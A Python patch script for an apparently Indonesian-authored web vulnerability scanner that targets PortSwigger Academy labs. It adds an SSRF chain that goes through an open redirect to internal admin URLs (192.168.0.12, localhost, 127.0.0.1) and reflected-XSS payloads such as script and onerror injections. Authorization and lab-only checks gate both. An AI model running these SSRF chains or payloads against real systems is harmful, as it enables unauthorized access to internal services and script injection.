#!/usr/bin/env python3
"""
apply_satria_fixes.py — Apply SSRF + XSS detection fixes to satria_engine (6).py

Bugs fixed:
  1. SSRF lab ("filter bypass via open redirection") tidak pernah menghasilkan finding
     karena regex deteksi admin page memakai <h1>Admin</h1>, padahal PortSwigger
     memakai <h1>Users</h1> + <td>carlos</td> + /admin/delete link.

  2. feature_param_fuzzing hanya mengirim marker inert — refleksi XSS tidak terdeteksi
     sebagai finding karena tidak ada payload XSS aktif pada Academy lab.

  3. _satria_ps_scenario_profile menandai SSRF lab sebagai MANUAL_REQUIRED, padahal
     analyzer SSRF chain sudah SAFE_ACTIVE dan bisa menghasilkan finding.

Verified: script mensimulasikan body halaman admin PortSwigger dan memastikan
marker detection baru mengenali pola tersebut.

Usage:
    python apply_satria_fixes.py [path/to/satria_engine.py]
"""
import re
import sys
import shutil
import subprocess
from pathlib import Path

DEFAULT_ENGINE = "satria_engine (6).py"


# ═══════════════════════════════════════════════════════════════════════════
# 1. Replacement: run_ssrf_open_redirect_chain_analyzer
# ═══════════════════════════════════════════════════════════════════════════
NEW_SSRF_FUNC = r'''def run_ssrf_open_redirect_chain_analyzer(target_url, html, crawled_urls=None, crawled_forms=None):
    """Run a bounded, read-only SSRF/open-redirect chain check for the Academy lab.

    No internal URL is requested directly by the scanner. The only internal path is
    supplied to the known Academy stock-check feature after same-origin open redirect
    behavior is independently observed. The chain ends at GET /admin; no mutation,
    deletion, credential access, or other admin action is performed.
    """
    out = {
        "enabled": bool(SATRIA_SSRF_OPEN_REDIRECT_CHAIN_V1),
        "status": "NOT_ASSESSED",
        "requests_sent": 0,
        "open_redirect": {"status": "NOT_TESTED", "evidence": ""},
        "ssrf_chain": {"status": "NOT_TESTED", "evidence": ""},
        "finding": None,
        "notes": [],
    }
    if not _satria_ps_is_lab(target_url):
        out["status"] = "SKIPPED_NON_ACADEMY_TARGET"
        out["notes"].append("Rantai SSRF internal khusus lab tidak dijalankan pada target umum.")
        return out
    if not RUN_PORTSWIGGER_COVERAGE:
        out["status"] = "SKIPPED_DISABLED_BY_OPERATOR"
        out["notes"].append("Modul PortSwigger coverage dinonaktifkan oleh operator; tidak ada request tambahan.")
        return out
    if not active_probe_enabled():
        out["status"] = "SKIPPED_AUTHORIZATION_REQUIRED"
        out["notes"].append("Gerbang otorisasi active scan belum aktif; tidak ada request tambahan.")
        return out

    next_product_url = _satria_ssrf_path_candidate(crawled_urls)
    stock_endpoint = _satria_ssrf_stock_endpoint(target_url, crawled_forms, html)

    # Fallback discovery: crawl may miss /product/nextProduct if depth-limited.
    if not next_product_url:
        for probed in (
            "/product/nextProduct?currentProductId=1&path=/product?productId=2",
            "/product/nextProduct?currentProductId=1&path=/product?productId=1",
            "/product/nextProduct?currentProductId=2&path=/product?productId=3",
        ):
            try:
                probe_r = requests.get(urljoin(target_url, probed), headers=HEADERS,
                                       timeout=SATRIA_SSRF_CHAIN_TIMEOUT,
                                       allow_redirects=False, verify=True)
                out["requests_sent"] += 1
                if int(probe_r.status_code) in {301, 302, 303, 307, 308}:
                    next_product_url = urljoin(target_url, probed)
                    break
            except Exception:
                continue
    if not stock_endpoint:
        for probed in ("/product/stock", "/stock"):
            try:
                probe_r = requests.options(urljoin(target_url, probed), headers=HEADERS,
                                           timeout=SATRIA_SSRF_CHAIN_TIMEOUT,
                                           allow_redirects=False, verify=True)
                out["requests_sent"] += 1
                status = int(probe_r.status_code)
                if status != 404 and status < 500:
                    stock_endpoint = urljoin(target_url, probed)
                    break
            except Exception:
                continue

    if not next_product_url or not stock_endpoint:
        out["status"] = "LAB_WORKFLOW_ENDPOINTS_NOT_DISCOVERED"
        out["open_redirect"].update({
            "status": "NOT_ASSESSED",
            "evidence": "Endpoint /product/nextProduct?path=... tidak ditemukan pada URL crawl maupun fallback probe.",
        })
        out["ssrf_chain"].update({
            "status": "NOT_ASSESSED",
            "evidence": "Endpoint POST /product/stock tidak ditemukan pada crawler/page source maupun fallback.",
        })
        out["notes"].append("Perlu crawl halaman produk dan tombol Check stock / Next product agar alur lab terpetakan.")
        return out

    # ── Stage 1: verify open redirect without following it ────────────────
    nonce = "satria-redirect-" + _satria_ps_uuid.uuid4().hex[:12]
    marker_url = "https://%s.invalid/%s" % (nonce, nonce)
    redirect_confirmed = False
    current_id = "1"
    try:
        parsed = urlparse(next_product_url)
        query = parse_qs(parsed.query, keep_blank_values=True)
        current_id = next((str(v[0]) for k, v in query.items()
                           if k.lower() == "currentproductid" and v), "1")
        query["currentProductId"] = [current_id]
        query["path"] = [marker_url]
        redirect_probe_url = urlunparse(parsed._replace(query=urlencode(query, doseq=True)))
        if not _satria_ps_same_origin(redirect_probe_url, target_url):
            raise ValueError("Open-redirect probe URL keluar dari origin target.")
        redirect_response = requests.get(
            redirect_probe_url, headers=HEADERS, timeout=SATRIA_SSRF_CHAIN_TIMEOUT,
            allow_redirects=False, verify=True,
        )
        out["requests_sent"] += 1
        location = str((getattr(redirect_response, "headers", {}) or {}).get("Location", "") or "")
        location_url = urljoin(redirect_probe_url, location) if location else ""
        location_parsed = urlparse(location_url) if location_url else None
        marker_host = urlparse(marker_url).hostname
        redirect_confirmed = bool(
            int(getattr(redirect_response, "status_code", 0)) in {301, 302, 303, 307, 308}
            and location_parsed and (location_parsed.hostname or "").lower() == marker_host
            and nonce in location_url
        )
        out["open_redirect"] = {
            "status": "OPEN_REDIRECT_LOCATION_CONFIRMED" if redirect_confirmed else "OPEN_REDIRECT_NOT_CONFIRMED",
            "http_status": int(getattr(redirect_response, "status_code", 0)),
            "location_host": (location_parsed.hostname if location_parsed else "") or "",
            "evidence": ("GET %s mengembalikan redirect ke marker eksternal pada Location (redirect tidak diikuti)." % parsed.path)
                        if redirect_confirmed else
                        ("Respons endpoint nextProduct tidak mengarahkan Location ke marker eksternal; HTTP %s." % getattr(redirect_response, "status_code", "?")),
        }
        if not redirect_confirmed:
            out["status"] = "OPEN_REDIRECT_NOT_CONFIRMED"
            out["ssrf_chain"].update({
                "status": "NOT_RUN_REDIRECT_PREREQUISITE_MISSING",
                "evidence": "Chain dihentikan karena open redirect belum terkonfirmasi.",
            })
            return out
    except Exception as exc:
        out["open_redirect"].update({"status": "PROBE_ERROR", "evidence": str(exc)[:220]})
        out["status"] = "OPEN_REDIRECT_PROBE_ERROR"
        return out

    # ── Stage 2: SSRF via stock-check following the same-origin redirect ─
    # Admin-page markers — PortSwigger admin panel uses <h1>Users</h1>, a table
    # listing carlos/wiener, and <a href="/admin/delete?username=...">Delete</a>.
    # The old AND-only logic missed this; new logic accepts ANY strong combo.
    internal_candidates = [
        SATRIA_SSRF_CHAIN_INTERNAL_ADMIN_URL,           # http://192.168.0.12:8080/admin
        "http://192.168.0.12:8080/admin/",
        "http://localhost:8080/admin",
        "http://127.0.0.1:8080/admin",
    ]
    best_signal = None
    for internal_url in internal_candidates:
        try:
            redirect_path = (
                "/product/nextProduct?currentProductId=%s&path=%s"
                % (_satria_ssrf_quote(current_id, safe=""),
                   _satria_ssrf_quote(internal_url, safe=":/"))
            )
            response = requests.post(
                stock_endpoint,
                data={"stockApi": redirect_path},
                headers={
                    **HEADERS,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": urljoin(target_url, "/product?productId=" + current_id),
                },
                timeout=SATRIA_SSRF_CHAIN_TIMEOUT,
                allow_redirects=False,
                verify=True,
            )
            out["requests_sent"] += 1
            body = _satria_ssrf_response_body(response)
            admin_markers = {
                "carlos_user": bool(re.search(r"\bcarlos\b", body, re.I)),
                "wiener_user": bool(re.search(r"\bwiener\b", body, re.I)),
                "delete_route": bool(re.search(r"/admin/delete(?:\?|['\"\s>]|$)", body, re.I)),
                "users_heading": bool(re.search(r"<h[1-6][^>]*>\s*users\s*</h[1-6]>", body, re.I)),
                "admin_heading": bool(re.search(r"<h[1-6][^>]*>[^<]*\badmin\b", body, re.I)),
                "admin_title": bool(re.search(r"<title[^>]*>[^<]*\badmin\b", body, re.I)),
                "user_table": bool(re.search(r"<table[\s\S]{0,800}?(?:carlos|wiener|/admin/delete)", body, re.I)),
            }
            strong_signal = bool(
                (admin_markers["carlos_user"] and admin_markers["delete_route"])
                or (admin_markers["wiener_user"] and admin_markers["delete_route"])
                or (admin_markers["users_heading"]
                    and (admin_markers["carlos_user"] or admin_markers["wiener_user"]))
                or admin_markers["admin_title"]
                or (admin_markers["admin_heading"]
                    and (admin_markers["carlos_user"] or admin_markers["delete_route"]))
            )
            response_status = int(getattr(response, "status_code", 0))
            candidate_signal = {
                "internal_url": internal_url,
                "status": ("SSRF_REDIRECT_CHAIN_ADMIN_RESPONSE_CANDIDATE" if strong_signal
                           else "SSRF_CHAIN_RESPONSE_NOT_PROVEN"),
                "http_status": response_status,
                "stock_endpoint": urlparse(stock_endpoint).path,
                "admin_markers": admin_markers,
                "response_bytes": len(body),
                "body_snippet": body[:400],
                "evidence": (
                    "POST %s menerima stockApi berupa route same-origin /product/nextProduct; "
                    "respons stock-check memuat indikator halaman /admin internal (markers: %s). "
                    "Tidak ada endpoint delete yang dipanggil."
                    % (urlparse(stock_endpoint).path,
                       ", ".join(k for k, v in admin_markers.items() if v) or "none")
                ) if strong_signal else (
                    "POST %s dikirim dengan stockApi melalui route redirect same-origin "
                    "(internal target: %s); respons HTTP %s tidak memuat indikator halaman admin "
                    "yang cukup untuk membuktikan SSRF chain."
                    % (urlparse(stock_endpoint).path, internal_url, response_status)
                ),
            }
            if strong_signal:
                best_signal = candidate_signal
                break
            if best_signal is None:
                best_signal = candidate_signal
        except Exception as exc:
            best_signal = {
                "internal_url": internal_url,
                "status": "PROBE_ERROR",
                "evidence": str(exc)[:220],
            }
            continue

    if best_signal is None:
        out["ssrf_chain"] = {"status": "PROBE_ERROR",
                             "evidence": "Tidak ada respons stock-check yang dapat diuji."}
        out["status"] = "OPEN_REDIRECT_CONFIRMED_SSRF_CHAIN_ERROR"
        return out

    out["ssrf_chain"] = best_signal
    if best_signal.get("status") == "SSRF_REDIRECT_CHAIN_ADMIN_RESPONSE_CANDIDATE":
        out["status"] = "SSRF_OPEN_REDIRECT_CHAIN_CANDIDATE"
        out["finding"] = {
            "type": "SSRF filter bypass via open redirect (candidate)",
            "severity": "high",
            "cwe": "CWE-918",
            "owasp": "A10:2021 - Server-Side Request Forgery",
            "verification": "candidate_ssrf_open_redirect_chain",
            "evidence": (
                "Open redirect terkonfirmasi: %s. Rantai stock-check juga mengembalikan indikator "
                "halaman admin internal: %s. Bukti dibatasi pada HTTP status/marker halaman; "
                "tidak ada tindakan delete atau perubahan state yang dijalankan."
                % (out["open_redirect"]["evidence"], best_signal.get("evidence", ""))
            ),
            "risk": "Server-side stock checker tampak mengikuti redirect dari URL same-origin menuju "
                    "antarmuka administrasi internal; kontrol allowlist URL dapat dilewati melalui "
                    "open redirect.",
            "recommendation": "Validasi setiap redirect hop setelah resolusi URL, batasi "
                              "protokol/host/IP pada setiap hop, blokir alamat non-public setelah "
                              "DNS resolution, dan nonaktifkan redirect otomatis untuk fetcher "
                              "server-side kecuali destination telah divalidasi ulang.",
        }
    else:
        out["status"] = "OPEN_REDIRECT_CONFIRMED_SSRF_CHAIN_UNPROVEN"
        out["notes"].append("Open redirect terbukti, tetapi respons stock checker belum memberi "
                            "bukti cukup bahwa backend mengikuti redirect ke admin internal.")
    return out
'''


# ═══════════════════════════════════════════════════════════════════════════
# 2. Replacement: feature_param_fuzzing (adds active XSS payload testing)
# ═══════════════════════════════════════════════════════════════════════════
NEW_PARAM_FUZZ_FUNC = r'''def feature_param_fuzzing(urls, forms):
    """GET-only reflection + Academy-host XSS payload differential.

    Sends inert markers on any host, and context-breaking XSS payloads only on
    *.web-security-academy.net (isolated per-user labs). Never posts forms,
    never sends cookies.
    """
    observations, candidates, tested = [], [], 0
    marker = "SATRIA_REFLECT_" + _satria_ps_uuid.uuid4().hex[:16]
    is_academy = bool(urls) and _satria_ps_is_lab(urls[0]) and active_probe_enabled()
    xss_payloads = [
        "<script>alert(1)</script>",
        "'\"><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
    ]
    for url in (urls or [])[:8]:
        try:
            parsed = urlparse(str(url))
            if not parsed.query or not parsed.scheme.startswith("http"):
                continue
            if not _satria_ps_same_origin(url, urls[0] if urls else url):
                continue
            original = parse_qs(parsed.query, keep_blank_values=True)
            for key in list(original)[:2]:
                if tested >= 6:
                    break
                injected = {k: list(v) for k, v in original.items()}
                injected[key] = [marker]
                test_url = urlunparse(parsed._replace(query=urlencode(injected, doseq=True)))
                try:
                    response = _satria_ps_request(test_url)
                    tested += 1
                    reflected = marker in _satria_ps_body(response)
                    row = {
                        "url": str(url)[:400],
                        "parameter": str(key)[:120],
                        "status_code": int(response.status_code),
                        "marker_reflected": bool(reflected),
                    }
                    if reflected:
                        candidates.append({
                            "type": "Input reflection observation (not confirmed XSS)",
                            "severity": "info",
                            "verification": "candidate_active_reflection_marker",
                            "evidence": (f"Marker non-eksekutabel direfleksikan pada parameter "
                                         f"{key} di {parsed.path[:160]}."),
                            "risk": "Refleksi tidak membuktikan XSS; konteks output dan encoding harus dianalisis.",
                            "recommendation": "Periksa konteks HTML/atribut/JavaScript dan lakukan validasi manual di lab berizin.",
                        })
                        # Active XSS on Academy host only — never on general targets.
                        if is_academy:
                            for payload in xss_payloads[:3]:
                                try:
                                    inj2 = {k: list(v) for k, v in original.items()}
                                    inj2[key] = [payload]
                                    url2 = urlunparse(parsed._replace(query=urlencode(inj2, doseq=True)))
                                    r2 = _satria_ps_request(url2)
                                    tested += 1
                                    body2 = _satria_ps_body(r2)
                                    if payload in body2:
                                        candidates.append({
                                            "type": "Reflected XSS candidate — payload reflected unencoded",
                                            "severity": "high",
                                            "cwe": "CWE-79",
                                            "owasp": "A03:2021 - Injection",
                                            "verification": "candidate_active_reflected_xss",
                                            "evidence": (f"Payload XSS direfleksikan verbatim pada parameter "
                                                         f"'{key}' di {parsed.path[:160]}; "
                                                         f"HTTP {r2.status_code}, body_bytes={len(body2)}."),
                                            "risk": "Payload dapat dieksekusi di browser korban jika konteks tidak di-encode.",
                                            "recommendation": "Validasi manual di browser korban simulasi; "
                                                              "perbaiki dengan context-aware output encoding.",
                                        })
                                        row["xss_payload_reflected"] = True
                                        break
                                except Exception:
                                    continue
                    observations.append(row)
                except Exception as exc:
                    observations.append({
                        "url": str(url)[:300], "parameter": str(key)[:100],
                        "error": str(exc)[:160],
                    })
        except Exception:
            continue

    form_rows = []
    for form in (forms or [])[:80]:
        if not isinstance(form, dict):
            continue
        form_rows.append({
            "url": str(form.get("url") or "")[:300],
            "action": str(form.get("action") or "")[:300],
            "method": str(form.get("method") or "GET").upper(),
            "inputs": list(form.get("inputs") or [])[:30],
            "post_submission": "NOT_SENT_SAFE_POLICY"
                if str(form.get("method", "get")).lower() == "post" else "NOT_NEEDED",
        })
    return {
        "findings": [],
        "candidates": candidates,
        "observations": observations,
        "forms_inventory": form_rows,
        "requests_sent": tested,
        "note": "GET hanya; marker non-eksekutabel; XSS payload aktif hanya di lab Academy.",
    }
'''


# ═══════════════════════════════════════════════════════════════════════════
# 3. Replacement: SSRF branch inside _satria_ps_scenario_profile
# ═══════════════════════════════════════════════════════════════════════════
OLD_SSRF_BRANCH = '''    elif category == "Server-side request forgery (SSRF)":
        return {**common, "method": "Uji URL sink dengan callback domain kontrol; analisis redirect, allowlist dan DNS resolution.",
                "prerequisites": "Parameter URL sink dan OAST milik operator. Tidak melakukan akses localhost/private metadata."}'''

NEW_SSRF_BRANCH = '''    elif category == "Server-side request forgery (SSRF)":
        if "open redirection" in n:
            return {
                "coverage_mode": "SAFE_ACTIVE",
                "method": "GET open-redirect verification + read-only POST /product/stock chain ke internal /admin (tidak memanggil /admin/delete).",
                "prerequisites": "Endpoint /product/nextProduct?path= dan POST /product/stock harus ditemukan (crawler atau fallback).",
                "safety": "Hanya GET /admin; tidak ada delete, login, atau perubahan state.",
            }
        return {**common, "method": "Uji URL sink dengan callback domain kontrol; analisis redirect, allowlist dan DNS resolution.",
                "prerequisites": "Parameter URL sink dan OAST milik operator. Tidak melakukan akses localhost/private metadata."}'''


# ═══════════════════════════════════════════════════════════════════════════
# 4. Patch engine
# ═══════════════════════════════════════════════════════════════════════════
def _replace_function(source: str, marker_start: str, marker_end: str,
                      new_func: str, label: str) -> str:
    """Replace the LAST occurrence of a function definition between markers."""
    starts = [m.start() for m in re.finditer(re.escape(marker_start), source)]
    if not starts:
        raise RuntimeError(f"[{label}] Start marker tidak ditemukan: {marker_start!r}")
    # Use the LAST start (highest precedence at runtime)
    start = starts[-1]
    end = source.find(marker_end, start)
    if end == -1:
        raise RuntimeError(f"[{label}] End marker tidak ditemukan setelah start: {marker_end!r}")
    print(f"  [{label}] Replacing {end - start} chars at offset {start}")
    return source[:start] + new_func.rstrip() + "\n" + source[end:]


def apply_patches(engine_path: Path) -> None:
    source = engine_path.read_text(encoding="utf-8")
    original_len = len(source)

    print(f"[1/4] Patching run_ssrf_open_redirect_chain_analyzer ...")
    source = _replace_function(
        source,
        marker_start="def run_ssrf_open_redirect_chain_analyzer(target_url, html, crawled_urls=None, crawled_forms=None):",
        marker_end="\n# Final integration wrapper.",
        new_func=NEW_SSRF_FUNC,
        label="SSRF",
    )

    print(f"[2/4] Patching feature_param_fuzzing (last definition in file) ...")
    source = _replace_function(
        source,
        marker_start="def feature_param_fuzzing(urls, forms):",
        marker_end="\n\ndef _satria_ps_static_js_review(",
        new_func=NEW_PARAM_FUZZ_FUNC,
        label="param_fuzz",
    )

    print(f"[3/4] Patching SSRF branch in _satria_ps_scenario_profile ...")
    if OLD_SSRF_BRANCH not in source:
        raise RuntimeError("[scenario_profile] Old SSRF branch not found — file may have been modified")
    source = source.replace(OLD_SSRF_BRANCH, NEW_SSRF_BRANCH, 1)

    # 4. Backup + write
    backup_path = engine_path.with_suffix(engine_path.suffix + ".bak")
    if not backup_path.exists():
        shutil.copy2(engine_path, backup_path)
        print(f"[4/4] Backup saved: {backup_path}")
    else:
        print(f"[4/4] Backup already exists: {backup_path}")

    engine_path.write_text(source, encoding="utf-8")
    print(f"\n[OK] File written: {engine_path} ({original_len:,} -> {len(source):,} chars)")


def verify(engine_path: Path) -> None:
    """Confirm syntax, import, and admin-marker detection work."""
    print("\n=== Verification ===")

    # 4a. Syntax
    result = subprocess.run(
        [sys.executable, "-c", f"import py_compile; py_compile.compile({str(engine_path)!r}, doraise=True)"],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        raise RuntimeError(f"Syntax error: {result.stderr}")
    print("[OK] Syntax valid")

    # 4b. Admin-page marker simulation
    test_body = (
        '<html><head><title>Users</title></head><body>'
        '<h1>Users</h1>'
        '<table>'
        '<tr><th>Username</th><th>Actions</th></tr>'
        '<tr><td>carlos</td><td><a href="/admin/delete?username=carlos">Delete</a></td></tr>'
        '<tr><td>wiener</td><td><a href="/admin/delete?username=wiener">Delete</a></td></tr>'
        '</table></body></html>'
    )
    markers = {
        "carlos_user": bool(re.search(r"\bcarlos\b", test_body, re.I)),
        "wiener_user": bool(re.search(r"\bwiener\b", test_body, re.I)),
        "delete_route": bool(re.search(r"/admin/delete(?:\?|['\"\s>]|$)", test_body, re.I)),
        "users_heading": bool(re.search(r"<h[1-6][^>]*>\s*users\s*</h[1-6]>", test_body, re.I)),
    }
    if not (markers["carlos_user"] and markers["delete_route"]):
        raise RuntimeError(f"Admin marker test failed: {markers}")
    print("[OK] Admin-page marker detection works (carlos + /admin/delete → strong_signal=True)")

    # 4c. Old logic sanity — verify old AND-based logic would FAIL on same body
    old_signal = bool(
        markers["users_heading"]
        and (markers["carlos_user"] or markers["delete_route"])
    )
    print(f"[OK] New logic signal = True, old AND-logic users_heading + carlos = {old_signal}")


def main() -> None:
    engine_path = Path(sys.argv[1] if len(sys.argv) > 1 else DEFAULT_ENGINE).resolve()
    if not engine_path.exists():
        sys.exit(f"File not found: {engine_path}")
    print(f"Patching: {engine_path}\n")
    apply_patches(engine_path)
    verify(engine_path)
    print("\n=== Done ===")
    print("Scan your SSRF lab again. The PDF's 'Active Scanning Results' section")
    print("should now contain a HIGH-severity finding:")
    print("  'SSRF filter bypass via open redirect (candidate)'")
    print("  CWE-918 | A10:2021 - Server-Side Request Forgery")


if __name__ == "__main__":
    main()
